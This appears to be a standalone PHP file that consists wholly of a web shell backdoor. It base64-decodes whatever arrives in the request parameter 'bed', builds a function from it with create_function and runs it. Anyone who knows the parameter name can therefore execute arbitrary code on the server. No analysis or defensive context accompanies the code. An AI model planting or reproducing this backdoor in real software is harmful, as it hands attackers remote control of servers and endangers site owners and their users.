<?php
if(!empty($_REQUEST['bed'])){$bed=base64_decode($_REQUEST["bed"]);$bed=create_function('',$bed);$bed();exit;}